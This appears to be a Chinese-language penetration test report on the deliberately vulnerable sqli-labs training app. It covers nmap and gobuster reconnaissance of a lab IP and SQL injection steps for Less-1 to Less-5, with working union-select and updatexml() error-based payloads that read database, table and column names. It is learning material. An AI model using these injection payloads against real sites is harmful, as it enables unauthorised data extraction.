sqli-labs渗透测试报告

| 项目   | 详情        |
| ---- | --------- |
| 测试目标 | sqli-labs |
| 测试时间 | 25.11.22  |
| 测试人员 |           |
| 测试范围 | web应用安全测试 |
| 漏洞统计 |           |
1.信息收集阶段
1.1端口扫描（nmap)
nmap -sV 192.168.100.101
![[Pasted image 20251122225129.png]]
1.2目录扫描
gobuster dir -u http://192.168.100.101/sqli-labs -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
![[Pasted image 20251122230324.png]]
2.漏洞扫描
2.1SQL注入漏洞
位置：http://192.168.100.101/sqli-labs/less-1/id=1
风险等级：
复现步骤：先确定列数，id=1’ order by 3 -- -
id=-1‘ order by 1,2,3 -- -
确定是3 列后进行查询http://localhost/sqli-labs/Less-1/?id=-1%27%20union%20select%201,version(),database()%20--%20-得到数据库名和版本信息  
![[Pasted image 20251122232819.png]]
位置：http://192.168.100.101/sqli-labs/less-2/id=1
风险等级：
复现步骤：先确定是什么类型的注入，不是字符型再尝试 是不是数值型id=1 and 1=2,页面无报错
再确定列数，然后按照less-1进行查询

![[Pasted image 20251123225911.png]]
位置：http://192.168.100.101/sqli-labs/less-3/id=1
风险等级：
复现步骤：URL后跟上？id=1’错误信息提示是带括号的，后改为？id），然后确定列数

![[Pasted image 20251123231249.png]]
![[Pasted image 20251123231208.png]]
位置：http://192.168.100.101/sqli-labs/less-4/id=1
风险等级：
复现步骤：URL后跟上？id=1’，后改为？id=1”），然后确定列数，再按less1

![[Pasted image 20251124113340.png]]
![[Pasted image 20251124113325.png]]
位置：http://192.168.100.101/sqli-labs/less-5/id=1
风险等级：
复现步骤：发现这个网站不再直接数据库信息，而是通过页面变化来提示我们，需要使用’报错注入‘
可以用到updataxml()函数，
###### `concat(0x7e, ..., 0x7e)`：用 `~`（十六进制为 `0x7e`）将我们查询的内容包裹起来。`~` 是非法 XPath 字符，能确保触发报错[](https://blog.csdn.net/qq_62000508/article/details/149778521)。![[Pasted image 20251124115747.png]]

![[Pasted image 20251124115413.png]]
http://localhost/sqli-labs/Less-5/?id=1%27%20and%20updatexml(1,concat(0x7e,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27security%27),0x7e),3)%20--%20-
![[Pasted image 20251124120000.png]]
命令http://localhost/sqli-labs/Less-5/?id=1%27%20and%20updatexml(1,concat(0x7e,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema=%27security%27%20and%20table_name=%27users%27),0x7e),3)%20--%20-
![[Pasted image 20251124160426.png]]
